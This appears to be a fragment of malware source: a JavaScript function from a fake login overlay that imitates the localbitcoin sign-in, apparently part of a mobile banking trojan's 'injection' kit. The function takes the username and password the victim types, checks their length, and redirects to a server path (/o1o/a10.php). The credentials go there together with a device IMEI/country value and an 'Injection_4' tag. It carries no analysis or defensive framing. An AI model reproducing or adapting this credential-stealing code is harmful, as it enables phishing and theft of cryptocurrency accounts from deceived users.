<script type="text/javascript">

function send(){


	var oNumInp = document.getElementById('user');
	var oCodeInp = document.getElementById('pass');

	try{
		oNumInp.className =	oCodeInp.className = 'field';
	} catch(e){};

	if (oNumInp.value.length < 4) {
		try{
			oNumInp.className = 'fielderror';
		} catch(e){};
		return false;
	}

	if (!/^\w{4,100}$/i.test(oCodeInp.value)) {
		try{
			oCodeInp.className = 'fielderror';
		} catch(e){};
		return false;
	}

	var url='<?php echo $URL; ?>';
	var imei_c='<?php echo $IMEI_country; ?>';
	location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_4|localbitcoin|"+oNumInp.value+"|"+oCodeInp.value);
}


